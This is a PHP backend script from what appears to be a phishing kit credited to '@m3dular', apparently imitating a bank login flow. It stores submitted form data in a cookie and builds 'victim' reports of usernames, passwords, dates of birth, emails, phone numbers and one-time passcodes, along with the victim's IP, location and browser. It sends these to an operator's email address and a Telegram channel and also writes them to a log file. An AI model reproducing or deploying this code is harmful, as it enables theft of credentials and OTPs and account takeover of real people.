


 

<?php

require_once "../../inc/m3dular_config.php"; 
require_once "../../m3cache/m3dular_functions.php"; 
require_once "../../m3cache/accesschecker.php";  
$loremdata=lorem(20);


// error_reporting(0);


$date = date('l d F Y');
$time = date('H:i');


$n=$_GET['n'];





// VLAD COOKIE LOADER!
// ATTACH vlad_forname to make it better


// print_r($_POST);
// print_r($_COOKIE);




$blacklist=array("csrf","session","device","signoncounter","Error","counter");
$blacklistvalue=array("undefined index");

$formarray=array();


foreach ($_POST as $key => $value){

    // blacklist check

$blacklistcheck=1;

// blacklist check and approve/break to clean inputs
    foreach($blacklist as $blacklistkeywrd){

        if (preg_match("/$blacklistkeywrd/i", $key)) {
            // echo "Found!". " in ". "$key" . "<br>" ;

           $blacklistcheck=0;
           break;
        }   }



        foreach($blacklistvalue as $blv){

            if (preg_match("/$blv/i", $value)) {
                // echo "Found!". " in ". "$key" . "<br>" ;
    
               $blacklistcheck=0;
               break;
            }   }



        if($blacklistcheck){
            $temparray=array($key=>$value);
            // array_push($formarray,$temparray);   
            $formarray[$key] =$value;        
        }


    

}



// print_r($formarray);

// echo "<hr>";

$currentformjson= json_encode($formarray); // overrite cookie string




$calcarray=array();


if(!isset($_COOKIE['vladdata'])){

// echo "Empty data so we set fresh json object";
$calcarray=array("name"=>"m3d");

$calcdata=$formarray; // SET THIS INCASE FIRST SENDING

// echo json_encode($calcarray); // overrite cookie string
setcookie('vladdata',$currentformjson , time() + (86400 * 30) , "/"); // 86400 = 1 day


}

else{


// load json array from cookie

// echo "loadjson form";



$cacheddata=json_decode($_COOKIE['vladdata'],true);

$calcdata=array_merge($cacheddata,$formarray);



// print_r($calcdata);


// combine with new data and overrite cookie


setcookie('vladdata',json_encode($calcdata ), time() + (86400 * 30) , "/"); // 86400 = 1 day




}






// HANDLING ALL MAILING INCLUDING MAILING ROUTES

if(isset($_GET['ml'])){




    $ip = $_SERVER['REMOTE_ADDR'];
    $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
    $VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
    $VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
    $VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
    $VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
    $VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
    

// data override
    
    if($_GET['ml']==1){

        $ml="LOGIN";


        $data = "
        ----- $OWNER  ----
    
    
            
        + -----------  Information ----------+
        Username  : {$calcdata['username']}
        Password  :  {$calcdata['password']}
    
     
        +------------ Client Information -------------+
        
        --- PC Details ----
        $VictimInfo1
        $VictimInfo2
        $VictimInfo3
        $VictimInfo4
        $VictimInfo5
        
        Received : $date @ $time
        ---- $OWNER  -------
        -- page by @m3dular | @m3dularupdates  ---";


    }



    if($_GET['ml']==2){

        $ml="DETAILS";

        $data = "
        ----- $OWNER  ----
    
    
            
        + -----------  Information ----------+
        Fullname  : {$calcdata['username']}
        Date Of Birth  :  {$calcdata['dob']}
        Email  :  {$calcdata['email']}
        Phone Number  :  {$calcdata['phone']}
    
     
        +------------ Client Information -------------+
        
        --- PC Details ----
        $VictimInfo1
        $VictimInfo2
        $VictimInfo3
        $VictimInfo4
        $VictimInfo5
        
        Received : $date @ $time
        ---- $OWNER  -------
        -- page by @m3dular | @m3dularupdates  ---";


    }

    if($_GET['ml']==3){

        $ml="OTP";

        $data = "
        ----- $OWNER  ----
    
    
            
        + -----------  Information ----------+
        OTP  : {$calcdata['otpcode']}
       
     
        +------------ Client Information -------------+
        
        --- PC Details ----
        $VictimInfo1
        $VictimInfo2
        $VictimInfo3
        $VictimInfo4
        $VictimInfo5
        
        Received : $date @ $time
        ---- $OWNER  -------
        -- page by @m3dular | @m3dularupdates  ---";


    }


   
    
    
    
    // mail data
    $headers    = "From:$from\r\nReturn-path:$bounce";
    mail($EMAIL,   "SANTS $ml from " . $_SERVER['REMOTE_ADDR'], $data);
    if($DEBUG){mail("test@localhost","SANTS $ml from " . $_SERVER['REMOTE_ADDR'] , $data, $headers);}
    if($TELEGRAM){sendToTelegram2("SANTS  $data",$TELEGRAMBOTTOKEN,$TELEGRAMCHANNELID );}
    if($SAVELOGS){

        if (!file_exists("$SAVEBINDIRECTORY")) {
        mkdir("$SAVEBINDIRECTORY", 0777, true);
    }
    
  // save there 
  
  
  
  $fp = fopen("$SAVEBINDIRECTORY"."/data.txt", 'a');//opens file in append mode  
  fwrite($fp, "\n");  
  fwrite($fp, $data);  
  fclose($fp);  
  
  
  
  }
  



// die("Mail Request");

}

// HANDLE REDIRECTS/ PAGE CHANGE



if(isset($_GET['rdr'])){

    echo "<script>document.location='$REDIRECT'</script>";

    die();
}


if(isset($_GET['n'])){

    echo "<script>document.location='../$n.php'</script>";
}

?>